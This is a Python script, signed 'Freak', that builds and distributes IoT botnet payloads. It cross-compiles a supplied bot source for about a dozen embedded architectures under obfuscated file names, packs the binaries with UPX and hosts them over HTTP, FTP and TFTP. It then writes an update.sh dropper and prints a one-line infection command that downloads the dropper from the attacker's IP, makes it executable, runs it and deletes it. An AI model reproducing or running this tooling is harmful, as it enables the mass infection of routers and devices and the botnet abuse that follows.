#Python auto cross compiler by void

import subprocess, sys

if len(sys.argv[2]) != 0:
    ip = sys.argv[2]
else:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <BOTNAME.C> <IPADDR> \x1b[0m")
    exit(1)
    
bot = sys.argv[1]

yourafag = "n"# raw_input("Get arch's? Y/n:")
if yourafag.lower() == "y":
    get_arch = True
else:
    get_arch = False

compileas = ["IObeENwjmips", #mips
             "IObeENwjmpsl", #mipsel
             "IObeENwjsh4", #sh4
             "IObeENwjx86", #x86
             "IObeENwjarm4", #Armv6l
             "IObeENwji686", #i686
             "IObeENwjppc", #ppc
             "IObeENwji586", #i586
             "IObeENwjm68k", #m68k
             "IObeENwjspc", #sparc
             "IObeENwjarm", #armv4
             "IObeENwjarm5", #armv5
             "IObeENwjppc-440fp"] #powerpc-440fp

getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',
'http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2',
'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2',
'https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2']

ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-sh4",
       "cross-compiler-x86_64",
       "cross-compiler-armv6l",
       "cross-compiler-i686",
       "cross-compiler-powerpc",
       "cross-compiler-i586",
       "cross-compiler-m68k",
       "cross-compiler-sparc",
       "cross-compiler-armv4l",
       "cross-compiler-armv5l",
       "cross-compiler-powerpc-440fp"]

def run(cmd):
    subprocess.call(cmd, shell=True)

if get_arch == True:
    #run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
    run("for f in *.tar.bz2; do tar -xvf \"$f\"; done")
    run("apt install docker.io")
    run("yum install docker")
    print("Cross Compilers Downloaded... NOW DOWNLOADING STATIC LIBRARIES FOR SSH")
    run("wget http://pkg.musl.cc/zlib/armv5l-linux-musleabihf/lib/libz.a -O libzarm5.a")
    run("wget http://pkg.musl.cc/libssh2/armv5l-linux-musleabihf/lib/libssh2.a -O ssharm5.a")
    run("wget https://pkg.musl.cc/openssl/armv5l-linux-musleabihf/lib/libssl.a -O libsslarm5.a")
    run("wget https://pkg.musl.cc/openssl/armv5l-linux-musleabihf/lib/libcrypto.a -O libcryptoarm5.a")
    run("wget https://pkg.musl.cc/openssl/armv5l-linux-musleabihf/lib/libcrypto.a -O libcryptoarm5.a")
    run("wget http://pkg.musl.cc/zlib/aarch64-linux-musl/lib/libz.a -O libzarm64.a")
    run("wget http://pkg.musl.cc/libssh2/aarch64-linux-musl/lib/libssh2.a -O ssharm64.a")
    run("wget https://pkg.musl.cc/openssl/aarch64-linux-musl/lib/libssl.a -O libsslarm64.a")
    run("wget https://pkg.musl.cc/openssl/aarch64-linux-musl/lib/libcrypto.a -O libcryptoarm64.a")
    run("wget https://pkg.musl.cc/openssl/aarch64-linux-musl/lib/libcrypto.a -O libcryptoarm64.a")
    run("wget http://pkg.musl.cc/zlib/mips-linux-muslsf/lib/libz.a -O libzmips.a")
    run("wget http://pkg.musl.cc/libssh2/mips-linux-muslsf/lib/libssh2.a -O sshmips.a")
    run("wget https://pkg.musl.cc/openssl/mips-linux-muslsf/lib/libssl.a -O libsslmips.a")
    run("wget https://pkg.musl.cc/openssl/mips-linux-muslsf/lib/libcrypto.a -O libcryptomips.a")
    run("wget https://pkg.musl.cc/openssl/mips-linux-muslsf/lib/libcrypto.a -O libcryptomips.a")
    run("wget http://pkg.musl.cc/zlib/mipsel-linux-musl/lib/libz.a -O libzmipsel.a")
    run("wget http://pkg.musl.cc/libssh2/mipsel-linux-musl/lib/libssh2.a -O sshmipsel.a")
    run("wget https://pkg.musl.cc/openssl/mipsel-linux-musl/lib/libssl.a -O libsslmipsel.a")
    run("wget https://pkg.musl.cc/openssl/mipsel-linux-musl/lib/libcrypto.a -O libcryptomipsel.a")
    run("wget https://pkg.musl.cc/openssl/mipsel-linux-musl/lib/libcrypto.a -O libcryptomipsel.a")
    run("wget http://pkg.musl.cc/zlib/i686-linux-musl/lib/libz.a -O libzi686.a")
    run("wget http://pkg.musl.cc/libssh2/i686-linux-musl/lib/libssh2.a -O sshi686.a")
    run("wget https://pkg.musl.cc/openssl/i686-linux-musl/lib/libssl.a -O libssli686.a")
    run("wget https://pkg.musl.cc/openssl/i686-linux-musl/lib/libcrypto.a -O libcryptoi686.a")
    run("wget https://pkg.musl.cc/openssl/i686-linux-musl/lib/libcrypto.a -O libcryptoi686.a")
    run("wget http://pkg.musl.cc/zlib/powerpc-linux-musl/lib/libz.a -O libzppc.a")
    run("wget http://pkg.musl.cc/libssh2/powerpc-linux-musl/lib/libssh2.a -O sshppc.a")
    run("wget https://pkg.musl.cc/openssl/powerpc-linux-musl/lib/libssl.a -O libsslppc.a")
    run("wget https://pkg.musl.cc/openssl/powerpc-linux-musl/lib/libcrypto.a -O libcryptoppc.a")
    run("wget https://pkg.musl.cc/openssl/powerpc-linux-musl/lib/libcrypto.a -O libcryptoppc.a")
    run("wget http://pkg.musl.cc/zlib/m68k-linux-musl/lib/libz.a -O libzm68k.a")
    run("wget http://pkg.musl.cc/libssh2/m68k-linux-musl/lib/libssh2.a -O sshm68k.a")
    run("wget https://pkg.musl.cc/openssl/m68k-linux-musl/lib/libssl.a -O libsslm68k.a")
    run("wget https://pkg.musl.cc/openssl/m68k-linux-musl/lib/libcrypto.a -O libcryptom68k.a")
    run("wget https://pkg.musl.cc/openssl/m68k-linux-musl/lib/libcrypto.a -O libcryptom68k.a")
    run("wget http://pkg.musl.cc/zlib/sh4-linux-musl/lib/libz.a -O libzsh4.a")
    run("wget http://pkg.musl.cc/libssh2/sh4-linux-musl/lib/libssh2.a -O sshsh4.a")
    run("wget https://pkg.musl.cc/openssl/sh4-linux-musl/lib/libssl.a -O libsslsh4.a")
    run("wget https://pkg.musl.cc/openssl/sh4-linux-musl/lib/libcrypto.a -O libcryptosh4.a")
    run("wget https://pkg.musl.cc/openssl/sh4-linux-musl/lib/libcrypto.a -O libcryptosh4.a")
    
num = 0
#http://pkg.musl.cc/zlib/mipsel-linux-musl/lib/
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc " + bot + " -o " + compileas[num])
    run("cp " + compileas[num] + " /var/www/html/S1eJ3")
    run("cp " + compileas[num] + " /var/ftp")
    run("cp " + compileas[num] + " /tftpboot")
    #run("rm " + compileas[num])
    num += 1
run("docker run --rm -v $(pwd):/workdir illuspas/xcgo x86_64-pc-freebsd9-gcc "+ sys.argv[1] + " -o IObeENwjbsd -DFREEBSD")
run("docker run --rm -iv${PWD}:/workdir illuspas/xcgo cp -a IObeENwjbsd /host-volume")
run("cp IObeENwjbsd /var/www/html/S1eJ3")
run("cp IObeENwjbsd /var/ftp")
run("cp IObeENwjbsd /tftpboot")
#run("rm IObeENwjbsd")

run("docker run --rm -v $(pwd):/workdir illuspas/xcgo x86_64-apple-darwin20-cc "+ sys.argv[1] + " -o IObeENwjdarwin -DDARWIN")
run("docker run --rm -iv${PWD}:/workdir illuspas/xcgo cp -a IObeENwjdarwin /host-volume")
run("cp IObeENwjdarwin /var/www/html/S1eJ3")
run("cp IObeENwjdarwin /var/ftp")
run("cp IObeENwjdarwin /tftpboot")
#run("rm IObeENwjdarwin")
run("docker run --rm -v $(pwd):/workdir illuspas/xcgo aarch64-linux-gnu-gcc "+ sys.argv[1] + " -o IObeENwjarm64 ssharm64.a libsslarm64.a libcryptoarm64.a libzarm64.a -DENEMY")
run("docker run --rm -iv${PWD}:/workdir illuspas/xcgo cp -a IObeENwjarm64 /host-volume")
run("cp IObeENwjarm64 /var/www/html/S1eJ3")
run("cp IObeENwjarm64 /var/ftp")
run("cp IObeENwjarm64 /tftpboot")
#run("rm IObeENwjarm64")
run("docker run --rm -v $(pwd):/workdir illuspas/xcgo arm-linux-gnueabihf-gcc "+ sys.argv[1] + " -o IObeENwjarm7 ssharm5.a libsslarm5.a libcryptoarm5.a libzarm5.a -DENEMY")
run("docker run --rm -iv${PWD}:/workdir illuspas/xcgo cp -a IObeENwjarm7 /host-volume")
run("cp IObeENwjarm7 /var/www/html/S1eJ3")
run("cp IObeENwjarm7 /var/ftp")
run("cp IObeENwjarm7 /tftpboot")
#run("rm IObeENwjarm7")
run("gcc "+ sys.argv[1] + " -lssh2 -o IObeENwjx64")
run("cp IObeENwjx64 /var/www/html/S1eJ3")
run("cp IObeENwjx64 /var/ftp")
run("cp IObeENwjx64 /tftpboot")
print("Cross Compiling Done!")
run("./upx /var/www/html/S1eJ3/*")
run("cp /var/www/html/S1eJ3/* /var/ftp")
run("cp /var/www/html/S1eJ3/* /tftpboot")
exit(0)
"""
print("Setting up your apache2 and tftp")

run("apt-get install apache2 -y")
run("service apache2 start")
run("apt-get install xinetd tftpd tftp -y")
run("apt-get install vsftpd -y")
run("service vsftpd start")

fh=open("/etc/xinetd.d/tftp", "w")
fh.write('''service tftp
{
protocol        = udp
port            = 69
socket_type     = dgram
wait            = yes
user            = nobody
server          = /usr/sbin/in.tftpd
server_args     = /tftpboot
disable         = no
}''')
fh.close()

run('mkdir /tftpboot')
run('mkdir /var/www/html/S1eJ3')

fh=open("/etc/vsftpd.conf", "w")
fh.write('''listen=YES
local_enable=YES
anonymous_enable=YES
no_anon_password=YES
write_enable=YES
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21''')
fh.close()
"""


run('echo "#!/bin/sh" > /var/www/html/update.sh')
run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /" >> /var/www/html/update.sh')

#for i in compileas:
#    run('echo "wget http://' + ip + '/S1eJ3/' + i + ' -o ' + i + '; busybox wget http://' + ip + '/S1eJ3/' + i + ' -o ' + i + '; curl http://' + ip + '/S1eJ3/' + i + ' -o ' + i + '; busybox curl http://' + ip + '/S1eJ3/' + i + ' -o ' + i + '; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; busybox ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/update.sh')

run("cp /var/www/html/update.sh /var/ftp")
run("cp /var/www/html/update.sh /tftpboot")

run("chmod -R 777 /tftpboot")
run("chown -R nobody /tftpboot")

run("service xinetd restart")
run("/etc/init.d/xinetd restart")
run("service vsftpd restart")
run("/etc/init.d/vsftpd restart")
run("service lighttpd restart")
run("/etc/init.d/lighttpd restart")

print("\x1b[0;32mSuccessfully cross compiled!\x1b[0m")
print("\x1b[0;32m" + 'Your link: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/update.sh -O update.sh; busybox wget http://' + ip + '/update.sh -O update.sh; curl http://' + ip + '/update.sh -O update.sh; busybox curl http://' + ip + '/update.sh -O update.sh; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' update.sh update.sh; chmod 777 update.sh; ./update.sh; rm -rf update.sh\x1b[0m')
print
print("\x1b[0;32mCoded By Freak\x1b[0m")